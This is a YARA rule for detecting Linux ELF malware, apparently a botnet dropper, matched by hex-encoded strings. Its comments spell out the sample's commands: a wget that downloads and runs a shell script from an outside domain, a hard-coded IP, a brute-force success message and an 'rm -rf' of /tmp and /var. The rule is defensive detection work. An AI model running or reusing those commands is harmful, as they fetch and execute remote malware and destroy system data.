rule _3eb78b49994cf3a546f15a7fbeaf7e8b882ebd223bce149ed70c96aab803521a { 
    meta : 
        author = "Z4que - All rights reverved"
		date = "2/11/2024"

    strings : 
        $header = { 7F 45 4C 46 }

        // 46.29.163.64
        $b1 = { 34 36 2E 32 39 2E 31 36 33 2E 36 34 }

        // wget http://tuff.cf/bins.sh
        $b2 = { 77 67 65 74 20 68 74 74 70 3A 2F 2F 74 75 66 66 2E 63 66 2F 62 69 6E 73 2E 73 68 }
   
        // chmod +x bins.sh
        $b3 = { 63 68 6D 6F 64 20 2B 78 20 62 69 6E 73 2E 73 68 }

        // sh bins.sh
        $b4 = { 73 68 20 62 69 6E 73 2E 73 68 }

        // rm -rf bins.sh
        $b5 = { 72 6D 20 2D 72 66 20 62 69 6E 73 2E 73 68 }

        // Successfully Bruteforced IP
        $b6 = { 53 75 63 63 65 73 73 66 75 6C 6C 79 20 42 72 75 74 65 66 6F 72 63 65 64 20 49 50 }

        // rm -rf /tmp/* /var/* /var/run/* /var/tmp/*
        $b7 = { 72 6D 20 2D 72 66 20 2F 74 6D 70 2F 2A 20 2F 76 61 72 2F 2A 20 2F 76 61 72 2F 72 75 6E 2F 2A 20 2F 76 61 72 2F 74 6D 70 2F 2A }

    condition : 
        ( $header at 0 ) 
        and 6 of ( $b* )
        and filesize < 200KB
}